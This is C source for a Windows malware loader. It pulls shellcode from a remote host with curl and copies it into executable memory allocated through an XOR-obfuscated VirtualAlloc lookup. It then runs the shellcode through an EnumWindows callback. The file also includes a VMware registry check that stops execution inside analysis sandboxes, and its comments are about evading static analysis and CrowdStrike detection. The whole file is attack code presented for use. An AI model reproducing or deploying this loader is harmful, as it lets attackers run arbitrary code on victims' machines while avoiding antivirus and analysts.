#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

VOID CALLBACK TimerProc(HWND hWnd, UINT message, UINT_PTR timerId, DWORD dwTime);
LPVOID (WINAPI * pAllocate) (LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
LPCSTR de_xor(unsigned char *payload, signed int payloadSize, unsigned char key);
BOOL CheckRegisteryKey();

typedef struct 
{
	unsigned char * payload;
	size_t payloadSize;
	unsigned char key;
	char * command;
	FILE * fpipe;
} TimerContext;

TimerContext g_context;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    PSTR lpCmdLine, int nCmdShow)
{
	// Implement this function with further virtualisation checks 
	CheckRegisteryKey();
	FreeConsole();
	unsigned char key = 's';
	// Further encrypt this shellcode (see if AV still identifies its as a )
	unsigned char procName[] = "\x25\x1a\x01\x07\x06\x12\x1f\x32\x1f\x1f\x1c\x10\x73";
	unsigned char kernel[] = "\x18\x16\x01\x1d\x16\x1f\x40\x41\x5d\x17\x1f\x1f\x73";
	// Pointer to command
	// Buffer to store the shellcode piped from command.
	unsigned char shellcode[460];
	// File storage of shellcode
	g_context.fpipe = NULL;
	g_context.key = key;
	g_context.payload = shellcode;
	// XOR this command to prevent static analyis
	// NOTE CrowdStrike Falcon Win/malicious_confidence_60% when not Xor'd
	g_context.command = "curl http://192.168.0.134/code.bin";
	g_context.payloadSize = sizeof(shellcode);
	pAllocate = (LPVOID(WINAPI *)(LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(GetModuleHandle(de_xor(kernel, sizeof(kernel), key)), de_xor(procName, sizeof(procName), key));


	UINT_PTR timerId = SetTimer(NULL, 1, 1, TimerProc);

	MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
	KillTimer(NULL, timerId);
	
	return 0;
}

VOID CALLBACK TimerProc(HWND hWnd, UINT message, UINT_PTR timerId, DWORD dwTime)
{
	
	// Buffer to store one byte piped from command to shellcode buffer
	unsigned char byte = 0;
	int counter = 0;
	// Check to see if results of command have failed to be piped to file storage
	if(NULL == (g_context.fpipe = (FILE *)popen(g_context.command, "r")))
	{
		exit(1);
	}
	printf("This has executed!");
	while (fread(&byte, sizeof(byte), 1, g_context.fpipe))
	{
		g_context.payload[counter] = byte;
		counter += 1;
	}

	// Closes handle to the file pointer
	fclose(g_context.fpipe);
	
    void * payload_mem = pAllocate(NULL, g_context.payloadSize , MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(payload_mem, g_context.payload, g_context.payloadSize);
    EnumWindows((WNDENUMPROC) payload_mem, (LPARAM) NULL);
};

LPCSTR de_xor(unsigned char *payload, signed int payloadSize, unsigned char key)
{
	for (int i = 0; i < payloadSize; i++)
	{
		payload[i] = payload[i]^key;
	}
	return (LPCSTR)payload;
}

BOOL CheckRegisteryKey()
{
    HKEY regHandle = NULL;
    LONG (WINAPI *rOpenKey)(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
    LSTATUS (WINAPI *rQueryValue)(HKEY, LPCWSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
    LSTATUS (WINAPI *rClose)(HKEY);

    HMODULE hModule = GetModuleHandle("advapi32.dll");
    if (!hModule) {
        printf("Failed to load advapi32.dll\n");
        return FALSE;
    }

    rOpenKey = (LONG (WINAPI *)(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY)) GetProcAddress(hModule, "RegOpenKeyExW");
    if (!rOpenKey) {
        printf("Failed to load RegOpenKeyExW\n");
        return FALSE;
    }

    rQueryValue = (LSTATUS (WINAPI *)(HKEY, LPCWSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD)) 
        GetProcAddress(hModule, "RegQueryValueExW");
    if (!rQueryValue) {
        printf("Failed to load RegQueryValueExW\n");
        return FALSE;
    }

    rClose = (LSTATUS (WINAPI *)(HKEY)) GetProcAddress(hModule, "RegCloseKey");
    if (!rClose) {
        printf("Failed to load RegCloseKey\n");
        return FALSE;
    }

    // Open registry key
    if (rOpenKey(HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000", 0, KEY_READ, &regHandle) == ERROR_SUCCESS)
    {
        // Query registry value
        if (rQueryValue(regHandle, L"VMware SCSI Controller", NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
        {
            rClose(regHandle); // Close handle
			exit(1);
            return TRUE;
        }
        rClose(regHandle); // Close handle
    }

    // Cleanup if key wasn't opened successfully
    if (regHandle) {
        rClose(regHandle);
    }
    return FALSE;
}




